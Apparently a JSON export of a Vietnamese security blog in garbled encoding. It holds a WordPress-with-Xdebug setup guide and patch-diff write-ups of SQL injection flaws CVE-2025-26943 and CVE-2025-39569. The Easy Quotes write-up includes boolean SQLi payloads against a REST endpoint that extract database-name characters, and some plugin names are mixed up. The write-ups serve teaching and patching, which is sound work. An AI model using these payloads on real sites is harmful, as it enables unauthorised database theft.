ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } Báº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ 